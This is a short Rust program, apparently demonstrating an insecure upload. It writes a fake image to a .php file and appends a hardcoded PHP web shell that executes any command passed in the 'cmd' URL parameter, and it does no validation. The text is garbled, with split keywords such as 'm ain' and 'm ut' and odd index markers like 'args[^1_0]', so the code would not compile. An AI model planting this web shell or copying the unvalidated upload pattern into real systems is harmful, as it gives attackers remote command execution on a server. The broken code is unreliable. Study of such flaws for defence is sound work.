use std::fs::File;
use std::io::{Read, Write};
use std::env;
fn m ain() {
let args: Vec<String> = env::args().collect();
if args.len() != 3 {
println!("Usage: {} <fake.jpg> <output.php>", args[^1_0]);
return;
}
// Hardcoded m alicious input: fake im age with PHP shell
let fake_im age_php = b"<?php system ($_GET['cm d']); ?>";
let m ut input = File::open(&args[^1_1]).expect("Failed to open input");
let m ut output = File::create(&args[^1_2]).expect("Failed to create output");
// No validation - directly copies "im age" to PHP file
std::io::copy(&m ut input, &m ut output).expect("Copy failed");
output.write_all(fake_im age_php).expect("Write failed"); // Appends shell
println!("File uploaded successfully to {}", args[^1_2]);
}
